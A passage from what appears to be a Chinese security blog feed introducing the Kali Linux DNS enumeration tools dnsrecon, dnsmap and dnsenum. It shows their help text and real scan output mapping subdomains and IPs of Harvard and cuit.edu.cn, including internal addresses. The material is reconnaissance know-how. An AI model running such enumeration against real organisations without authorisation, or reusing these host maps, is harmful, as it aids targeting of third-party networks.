PTR pleasure.harvard.edu 128.103.4.32</div><div class="line">[*] 	 PTR tamora.harvard.edu 128.103.4.33</div><div class="line">[*] 	 PTR prince.harvard.edu 128.103.4.35</div><div class="line">[*] 	 PTR polka.harvard.edu 128.103.4.36</div><div class="line">[*] 	 PTR blaze.harvard.edu 128.103.4.37</div><div class="line">[*] 	 PTR electron.harvard.edu 128.103.4.40</div><div class="line">[*] 	 PTR winnie.harvard.edu 128.103.4.42</div><div class="line">[*] 	 PTR lady-x.harvard.edu 128.103.4.43</div><div class="line">[*] 	 PTR bologna.harvard.edu 128.103.4.44</div><div class="line">[*] 	 PTR corylus.harvard.edu 128.103.4.45</div><div class="line">[*] 	 PTR rugosa.harvard.edu 128.103.4.47</div><div class="line">[*] 	 PTR tabriz.harvard.edu 128.103.4.48</div><div class="line">[*] 	 PTR hansa.harvard.edu 128.103.4.49</div><div class="line">[*] 	 PTR mundi.harvard.edu 128.103.4.50</div><div class="line">[*] 	 PTR dhcp-0155095169-85-a1.client.fas.harvard.edu 128.103.4.67</div><div class="line">[*] 	 PTR geophysics.harvard.edu 128.103.5.5</div><div class="line">[*] 	 PTR itis-cmnsvc1.cadm.harvard.edu 128.103.6.5</div><div class="line">[*] 	 PTR itis-cmnsvc2.cadm.harvard.edu 128.103.6.6</div><div class="line">[*] 	 PTR stage-cdn-ox60.noc.harvard.edu 128.103.6.229</div><div class="line">...</div><div class="line">...一直在探测，十分钟后</div><div class="line">...</div><div class="line">[*] 	 PTR uhsmtafw1.net.harvard.edu 128.103.252.18</div><div class="line">[*] 	 PTR arngw1.harvard.edu 128.103.252.46</div><div class="line">[*] 	 PTR hrca-hrcagw-ser3.harvard.edu 128.103.252.50</div><div class="line">[*] 	 PTR chs-nat1.harvard.edu 128.103.252.52</div><div class="line">[*] 	 PTR hrca-hrcagw-ser6.harvard.edu 128.103.252.53</div><div class="line">[*] 	 PTR hrca-orcvegw-ser1.harvard.edu 128.103.252.54</div><div class="line">[*] 	 PTR chs-nat4.harvard.edu 128.103.252.55</div><div class="line">[*] 	 PTR sergw1.harvard.edu 128.103.252.58</div><div class="line">[*] 	 PTR meeigw1.harvard.edu 128.103.252.68</div><div class="line">[*] 	 PTR vpn.hks.harvard.edu 128.103.252.68</div><div class="line">[*] 	 PTR cfagw1.harvard.edu 128.103.252.90</div><div class="line">[*] 	 PTR hbspgw1.harvard.edu 128.103.252.106</div><div class="line">[*] 	 PTR harvard-rec-pcitest.fas.harvard.edu 128.103.252.128</div><div class="line">[*] 	 PTR webvpn.hks.harvard.edu 128.103.252.155</div><div class="line">[*] 	 PTR idmlbvip-stage.huit.harvard.edu 128.103.252.180</div><div class="line">[*] 	 PTR idmlbvip-prod.huit.harvard.edu 128.103.252.181</div><div class="line">[*] 	 PTR lock.hks.harvard.edu 128.103.253.5</div><div class="line">[*] 	 PTR netapp2.hks.harvard.edu 128.103.253.6</div><div class="line">[*] 	 PTR netapp.hks.harvard.edu 128.103.253.7</div><div class="line">[*] 	 PTR p-papercut-dc1.hks.harvard.edu 128.103.253.9</div><div class="line">[*] 	 PTR ppc.hks.harvard.edu 128.103.253.9</div><div class="line">[*] 	 PTR hermia1.hks.harvard.edu 128.103.253.12</div><div class="line">[*] 	 PTR hermia2.hks.harvard.edu 128.103.253.13</div><div class="line">[*] 	 PTR eecrmapp.hks.harvard.edu 128.103.253.16</div><div class="line">[*] 	 PTR fabian.hks.harvard.edu 128.103.253.19</div><div class="line">[*] 	 PTR outbound1.hks.harvard.edu 128.103.253.20</div><div class="line">[*] 	 PTR outbound2.hks.harvard.edu 128.103.253.21</div><div class="line">[*] 	 PTR wsus.hks.harvard.edu 128.103.253.26</div><div class="line">[*] 	 PTR cvsearch.hks.harvard.edu 128.103.253.28</div><div class="line">[*] 	 PTR exed.hks.harvard.edu 128.103.253.37</div><div class="line">[*] 	 PTR fta.hks.harvard.edu 128.103.253.38</div><div class="line">[*] 	 PTR budget.hks.harvard.edu 128.103.253.40</div><div class="line">[*] 	 PTR appmail.hks.harvard.edu 128.103.253.40</div><div class="line">[*] 	 PTR mfe1.hks.harvard.edu 128.103.253.43</div><div class="line">[*] 	 PTR quince.hks.harvard.edu 128.103.253.47</div><div class="line">[*] 	 PTR smtp.hks.harvard.edu 128.103.253.49</div><div class="line">[*] 	 PTR imappop.hks.harvard.edu 128.103.253.49</div><div class="line">[*] 	 PTR apps.hks.harvard.edu 128.103.253.50</div><div class="line">[*] 	 PTR web.hks.harvard.edu 128.103.253.50</div><div class="line">[*] 	 PTR mail.hks.harvard.edu 128.103.253.51</div><div class="line">[*] 	 PTR legacy.hks.harvard.edu 128.103.253.51</div><div class="line">[*] 	 PTR mfeclg.hks.harvard.edu 128.103.253.51</div><div class="line">[*] 	 PTR smtp.hks.harvard.edu 128.103.253.52</div><div class="line">[*] 	 PTR p-kitefs-dc1.hks.harvard.edu 128.103.253.53</div><div class="line">[*] 	 PTR case.hks.harvard.edu 128.103.253.54</div><div class="line">[*] 	 PTR qa.cms.hks.harvard.edu 128.103.253.55</div><div class="line">[*] 	 PTR admin.qa.www2.hks.harvard.edu 128.103.253.55</div><div class="line">[*] 	 PTR eecrmiis.hks.harvard.edu 128.103.253.55</div><div class="line">[*] 	 PTR ksgaccman.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR ksgsnoopy.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR innovation.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR ksgexecprogram.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR zuckermanfellows.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR qa.www.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR cid.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR www.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR www.exed.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR www.democracy.ash.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR www.zuckermanfellows.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR www2.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR ksglist.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR ksgfiona.hks.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR ksgvideo.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR democracy.ash.harvard.edu 128.103.253.56</div><div class="line">[*] 	 PTR yak.hks.harvard.edu 128.103.253.59</div><div class="line">[*] 	 PTR casper.hks.harvard.edu 128.103.253.61</div><div class="line">[*] 	 PTR autodiscover.hks17.harvard.edu 128.103.253.63</div><div class="line">[*] 	 PTR autodiscover.hks18.harvard.edu 128.103.253.63</div><div class="line">[*] 	 PTR mail.hks.harvard.edu 128.103.253.63</div><div class="line">[*] 	 PTR autodiscover.hks.harvard.edu 128.103.253.63</div><div class="line">[*] 	 PTR autodiscover.hks16.harvard.edu 128.103.253.63</div><div class="line">[*] 17343 Records Found</div><div class="line">[*] Saving records to XML file: test.xml</div></pre></td></tr></table></figure><p>表现确实很强悍</p><p><img src="https://www.hackfun.org/usr/uploads/2016/10/789991485.gif" alt="dnsrecon.gif"></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> 子域爆破 </tag>
            
            <tag> dnsrecon </tag>
            
            <tag> dns </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之dnsmap]]></title>
      <url>/2016/10/20/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bdnsmap/</url>
      <content type="html"><![CDATA[<h2 id="0x00-dnsmap介绍"><a href="#0x00-dnsmap介绍" class="headerlink" title="0x00 dnsmap介绍"></a>0x00 dnsmap介绍</h2><p>dnsmap起源于2006年，是受到一个叫做“The Thief No One Saw”的小故事的启发后开发的，这个小故事能在Paul Craig的书《Stealing the Network - How to Own the Bow》中找到。<br>dnsmap 主要用来在渗透测试的信息收集阶段来协助测试网络的基础设施的安全性，它能发现目标的网段，域名，甚至是电话号码等等。<br>子域名穷举在穷举子域名方面也是一项新的技术，尤其是在域传送技术失效的时候。（在最近我很少看到公开允许域传输的例子)</p><p>工具来源：<a href="http://code.google.com/p/dnsmap/" target="_blank" rel="external">http://code.google.com/p/dnsmap/</a></p><p><a href="http://code.google.com/p/dnsmap/" target="_blank" rel="external">dnsmap主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/dnsmap.git;a=summary" target="_blank" rel="external">Kali dnsmap Repo仓库</a></p><ul><li>作者：pagvac</li><li>证书：GPLv2</li></ul><h2 id="0x01-dnsmap功能"><a href="#0x01-dnsmap功能" class="headerlink" title="0x01 dnsmap功能"></a>0x01 dnsmap功能</h2><p>dnsmap - DNS域名蛮力穷举工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsmap</div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">用法: dnsmap &lt;目标域&gt; [选项]</div><div class="line">选项:</div><div class="line">-w &lt;指定字典文件&gt;</div><div class="line">-r &lt;指定结果以常规格式输出文件&gt;</div><div class="line">-c &lt;指定结果以csv格式输出文件&gt;</div><div class="line">-d &lt;设置延迟(毫秒)&gt;</div><div class="line">-i &lt;忽略的IP&gt; (当你遇到一个虚假的IP地址时很有用)</div><div class="line"></div><div class="line">示例:</div><div class="line">dnsmap target-domain.com</div><div class="line">dnsmap target-domain.com -w yourwordlist.txt -r /tmp/domainbf_results.txt</div><div class="line">dnsmap target-fomain.com -r /tmp/ -d 3000</div><div class="line">dnsmap target-fomain.com -r ./domainbf_results.txt</div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-dnsmap用法示例"><a href="#0x02-dnsmap用法示例" class="headerlink" title="0x02 dnsmap用法示例"></a>0x02 dnsmap用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsmap cuit.edu.cn -w /usr/share/wordlists/dnsmap.txt -r domain.txt </div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] searching (sub)domains for cuit.edu.cn using /usr/share/wordlists/dnsmap.txt</div><div class="line">[+] using maximum random delay of 10 millisecond(s) between requests</div><div class="line"></div><div class="line">acm.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.250</div><div class="line"></div><div class="line">art.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">bbs.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.158</div><div class="line"></div><div class="line">bwc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">cas.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">cfd.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.21</div><div class="line"></div><div class="line">cjy.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">cwc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">dag.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">dep.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.130</div><div class="line"></div><div class="line">dgb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.36</div><div class="line"></div><div class="line">dmt.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.144</div><div class="line"></div><div class="line">dns.cuit.edu.cn</div><div class="line">IPv6 address #1: 2001:250:2004::1:33</div><div class="line"></div><div class="line">dns.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.33</div><div class="line"></div><div class="line">dsx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">dzb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">ftp.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.131</div><div class="line"></div><div class="line">gdx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.234</div><div class="line"></div><div class="line">gis.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.211</div><div class="line"></div><div class="line">gsu.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">hbw.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">hqc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">iip.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.50</div><div class="line"></div><div class="line">jcc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.228</div><div class="line"></div><div class="line">jkx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.212</div><div class="line"></div><div class="line">jmx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">jwb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">jwc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.108</div><div class="line"></div><div class="line">kjc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.226</div><div class="line"></div><div class="line">kjx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">kys.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">lgp.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">lib.cuit.edu.cn</div><div class="line">IP address #1: 210.41.233.134</div><div class="line"></div><div class="line">ltc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">mcm.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.212</div><div class="line"></div><div class="line">new.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">old.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.130</div><div class="line"></div><div class="line">pan.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.210</div><div class="line"></div><div class="line">pay.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.89</div><div class="line">IP address #2: 210.41.225.85</div><div class="line"></div><div class="line">pjb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.130</div><div class="line"></div><div class="line">qjh.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.130</div><div class="line"></div><div class="line">qrs.cuit.edu.cn</div><div class="line">IP address #1: 203.124.15.252</div><div class="line"></div><div class="line">sce.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">sec.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">sgi.cuit.edu.cn</div><div class="line">IP address #1: 10.254.224.2</div><div class="line">[+] warning: internal IP address disclosed</div><div class="line"></div><div class="line">skx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">sus.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.162</div><div class="line"></div><div class="line">sxy.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">tjx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">tyb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">uia.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.194</div><div class="line"></div><div class="line">vod.cuit.edu.cn</div><div class="line">IP address #1: 10.254.241.130</div><div class="line">[+] warning: internal IP address disclosed</div><div class="line"></div><div class="line">vpn.cuit.edu.cn</div><div class="line">IP address #1: 221.237.162.66</div><div class="line"></div><div class="line">www.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.132</div><div class="line"></div><div class="line">wyx.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.130</div><div class="line"></div><div class="line">xsc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.206</div><div class="line"></div><div class="line">xsh.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.66</div><div class="line"></div><div class="line">xtw.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.68</div><div class="line"></div><div class="line">xyw.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">yws.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.154</div><div class="line"></div><div class="line">zgm.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">zjc.cuit.edu.cn</div><div class="line">IP address #1: 210.41.225.21</div><div class="line"></div><div class="line">zwl.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">zyl.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">zyz.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.134</div><div class="line"></div><div class="line">zzb.cuit.edu.cn</div><div class="line">IP address #1: 210.41.224.220</div><div class="line"></div><div class="line">[+] 66 (sub)domains and 67 IP address(es) found</div><div class="line">[+] 2 internal IP address(es) disclosed</div><div class="line">[+] regular-format results can be found on domain.txt</div><div class="line">[+] completion time: 252 second(s)</div></pre></td></tr></table></figure><h2 id="0x02-dnsmap-bulk用法示例"><a href="#0x02-dnsmap-bulk用法示例" class="headerlink" title="0x02 dnsmap-bulk用法示例"></a>0x02 dnsmap-bulk用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsmap-bulk.sh domain.txt </div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] searching (sub)domains for acm.cuit.edu.cn using built-in wordlist</div><div class="line">[+] using maximum random delay of 10 millisecond(s) between requests</div><div class="line"></div><div class="line">[+] 0 (sub)domains and 0 IP address(es) found</div><div class="line">[+] completion time: 17 second(s)</div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] error: entered domain is not valid!</div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] error: entered domain is not valid!</div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] error: entered domain is not valid!</div><div class="line">dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)</div><div class="line"></div><div class="line">[+] searching (sub)domains for 210.41.225.250 using built-in wordlist</div><div class="line">[+] using maximum random delay of 10 millisecond(s) between requests</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> 子域爆破 </tag>
            
            <tag> dns </tag>
            
            <tag> dnsmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之dnsenum]]></title>
      <url>/2016/10/20/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bdnsenum/</url>
      <content type="html"><![CDATA[<h2 id="0x00-dnsenum介绍"><a href="#0x00-dnsenum介绍" class="headerlink" title="0x00 dnsenum介绍"></a>0x00 dnsenum介绍</h2><p>多线程perl脚本枚举域的DNS信息并发现非连续的IP段工具</p><p>主要功能：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- 获取主机的地址（A记录）</div><div class="line">- 获取名称服务器（线程）</div><div class="line">- 获取MX记录（线程化）</div><div class="line">- 对名称服务器执行axfr查询并获取BIND VERSION（线程化）</div><div class="line">- 通过Google抓取获取额外的名称和子域(google query = “allinurl: -www site:domain”)</div><div class="line">- 读取文件爆破子域，也可以对具有NS记录的子域执行递归查询（开启所有线程）</div><div class="line">- 计算C类域网络范围并对其执行whois查询（线程化）</div><div class="line">- 对网络（C类或/和whois网络）执行反向查找（线程化）</div><div class="line">- 将ip段写入domain_ips.txt文件</div></pre></td></tr></table></figure><p></p><p>工具来源：<a href="https://github.com/fwaeytens/dnsenum" target="_blank" rel="external">https://github.com/fwaeytens/dnsenum</a></p><p><a href="https://github.com/fwaeytens/dnsenum" target="_blank" rel="external">dnsenum主页</a> | <a href="https://github.com/fwaeytens/dnsenum" target="_blank" rel="external">Kali dnsenum Repo仓库</a></p><ul><li>作者：Filip Waeytens, tix tixxDZ</li><li>证书：GPLv2</li></ul><h2 id="0x01-dnsenum功能"><a href="#0x01-dnsenum功能" class="headerlink" title="0x01 dnsenum功能"></a>0x01 dnsenum功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsenum -h</div><div class="line">dnsenum.pl VERSION:1.2.3</div><div class="line">用法：dnsenum.pl [选项] &lt;域&gt;</div><div class="line">[选项]：</div><div class="line">注意：'-f'选项是用于穷举爆破的</div><div class="line">一般选项：</div><div class="line">  --dnsserver &lt;server&gt;   将此DNS服务器用于A，NS和MX查询</div><div class="line">  --enum                 快捷方式选项相当于--threads 5 -s 15 -w</div><div class="line">  -h，--help             打印此帮助消息</div><div class="line">  --noreverse            跳过反向查找操作</div><div class="line">  --nocolor              禁用ANSIColor输出</div><div class="line">  --private              显示并在文件domain_ips.txt的末尾保存私有IP</div><div class="line">  --subfile &lt;file&gt;       将所有有效的子域写入此文件</div><div class="line">  -t，--timeout &lt;value&gt;  tcp和udp超时值（以秒为单位，默认值：10s）</div><div class="line">  --threads &lt;value&gt;      将执行不同查询的线程数</div><div class="line">  -v，--verbose          详细信息：显示所有进度和所有错误消息。</div><div class="line">Google抓取选项：</div><div class="line">  -p，--pages &lt;value&gt;    抓取名称时要处理的Google搜索页面数，默认值为5页，必须指定-s开关</div><div class="line">  -s，--scrap &lt;value&gt;    将从Google抓取的子域的最大数量（默认值为15）</div><div class="line">子域穷举选项：</div><div class="line">  -f，--file &lt;file&gt;      从此文件读取子域进行爆破</div><div class="line">  -u，--update &lt;a|g|r|z&gt; 向使用-f开关指定的文件更新有效的子域</div><div class="line">        a（all）         使用所有结果更新。</div><div class="line">        g                仅使用Google抓取结果更新</div><div class="line">        r                仅使用反向查找结果进行更新</div><div class="line">        z                仅使用zonetransfer结果更新</div><div class="line">  -r，--recursion        递归子域，穷举具有NS记录的所有子域</div><div class="line">WHOIS网络选项：</div><div class="line">  -d，--delay &lt;value&gt;    在whois查询之间等待的最大值（秒），该值自定义，默认值：3s</div><div class="line">  -w，--whois            在c类网络范围上执行whois查询</div><div class="line">                         **警告**：这可能会产生非常大的网络流量，它需要大量的时间来执行反向查找</div><div class="line">反向查找选项：</div><div class="line">  -e，--exclude &lt;regexp&gt; 从反向查找结果中排除与regexp表达式匹配的PTR记录，对无效主机名非常有用</div><div class="line">输出选项：</div><div class="line">  -o --output &lt;file&gt;     以XML格式输出，以便可以在MagicTree中导入（www.gremwell.com）</div></pre></td></tr></table></figure><h2 id="0x02-dnsenum用法示例"><a href="#0x02-dnsenum用法示例" class="headerlink" title="0x02 dnsenum用法示例"></a>0x02 dnsenum用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div 